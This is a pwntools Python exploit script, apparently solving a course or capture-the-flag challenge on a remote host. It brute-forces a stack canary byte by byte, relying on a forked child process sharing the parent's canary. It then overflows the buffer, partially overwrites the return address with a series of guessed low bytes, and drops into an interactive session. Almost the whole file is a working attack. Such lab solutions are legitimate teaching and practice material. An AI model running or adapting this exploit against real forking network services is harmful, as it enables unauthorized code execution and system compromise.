port = 50196
host = "cs4401shell2.walls.ninja"

gdbscript = '''
            break *main
            shell tmux swap-pane -U
            shell tmux select-layout main-vertical
            continue
            '''

from pwn import *

bpath = './fork'
elf = ELF(bpath)
context.binary = bpath
context.log_level = 'debug'


# when the process gets forked, the child process copies the parent's memory
# meaning that the canary value is the same in both processes
# this means that we can gradually guess the canary value one byte at a time
# p = remote(host, port)

offset_canary = 0x68
canary = b''
curr = offset_canary + 1
p = remote(host, port)
with context.silent:
    while len(canary) < 8:
        for i in range(0xff):
            print(p.recvuntil(b"How many bites? "))
            p.sendline(f"{curr}".encode())      # send the number of bytes to write
            
            canary_guess = canary + bytes([i])
            print(f"Trying canary: {canary_guess}")
            print(f"Current canary: {canary}")
            
            p.sendline(flat({offset_canary: canary_guess}))
            
            msg = p.recvuntil(b"Here's your fork!\n")
            print(msg)
            
            if not b"smashing" in msg:
                print("Canary byte found: ", hex(i))
                canary += bytes([i])
                curr += 1
                break
        
# now we have the canary value, we can overwrite the return address
# stack layout:
# [buffer][canary][saved rbp][return address]
exploit_str = flat({offset_canary: canary, offset_canary+8: p64(0xdeadbeefdeadbeef)}) + b'\x7a\x1a' 
p.sendline(f"{len(exploit_str)}".encode())
p.sendline(exploit_str)

exploit_str = flat({offset_canary: canary, offset_canary+8: p64(0xdeadbeefdeadbeef)}) + b'\x7a\x2a' 
p.sendline(f"{len(exploit_str)}".encode())
p.sendline(exploit_str)

exploit_str = flat({offset_canary: canary, offset_canary+8: p64(0xdeadbeefdeadbeef)}) + b'\x7a\x3a' 
p.sendline(f"{len(exploit_str)}".encode())
p.sendline(exploit_str)

exploit_str = flat({offset_canary: canary, offset_canary+8: p64(0xdeadbeefdeadbeef)}) + b'\x7a\x4a' 
p.sendline(f"{len(exploit_str)}".encode())
p.sendline(exploit_str)

exploit_str = flat({offset_canary: canary, offset_canary+8: p64(0xdeadbeefdeadbeef)}) + b'\x7a\x5a' 
p.sendline(f"{len(exploit_str)}".encode())
p.sendline(exploit_str)

exploit_str = flat({offset_canary: canary, offset_canary+8: p64(0xdeadbeefdeadbeef)}) + b'\x7a\x6a' 
p.sendline(f"{len(exploit_str)}".encode())
p.sendline(exploit_str)

exploit_str = flat({offset_canary: canary, offset_canary+8: p64(0xdeadbeefdeadbeef)}) + b'\x7a\x7a' 
p.sendline(f"{len(exploit_str)}".encode())
p.sendline(exploit_str)

exploit_str = flat({offset_canary: canary, offset_canary+8: p64(0xdeadbeefdeadbeef)}) + b'\x7a\x8a' 
p.sendline(f"{len(exploit_str)}".encode())
p.sendline(exploit_str)

exploit_str = flat({offset_canary: canary, offset_canary+8: p64(0xdeadbeefdeadbeef)}) + b'\x7a\x9a' 
p.sendline(f"{len(exploit_str)}".encode())
p.sendline(exploit_str)

exploit_str = flat({offset_canary: canary, offset_canary+8: p64(0xdeadbeefdeadbeef)}) + b'\x7a\xaa' 
p.sendline(f"{len(exploit_str)}".encode())
p.sendline(exploit_str)

exploit_str = flat({offset_canary: canary, offset_canary+8: p64(0xdeadbeefdeadbeef)}) + b'\x7a\xba' 
p.sendline(f"{len(exploit_str)}".encode())
p.sendline(exploit_str)

exploit_str = flat({offset_canary: canary, offset_canary+8: p64(0xdeadbeefdeadbeef)}) + b'\x7a\xca' 
p.sendline(f"{len(exploit_str)}".encode())
p.sendline(exploit_str)

exploit_str = flat({offset_canary: canary, offset_canary+8: p64(0xdeadbeefdeadbeef)}) + b'\x7a\xda' 
p.sendline(f"{len(exploit_str)}".encode())
p.sendline(exploit_str)

exploit_str = flat({offset_canary: canary, offset_canary+8: p64(0xdeadbeefdeadbeef)}) + b'\x7a\xea' 
p.sendline(f"{len(exploit_str)}".encode())
p.sendline(exploit_str)

exploit_str = flat({offset_canary: canary, offset_canary+8: p64(0xdeadbeefdeadbeef)}) + b'\x7a\xfa' 
p.sendline(f"{len(exploit_str)}".encode())
p.sendline(exploit_str)


p.interactive()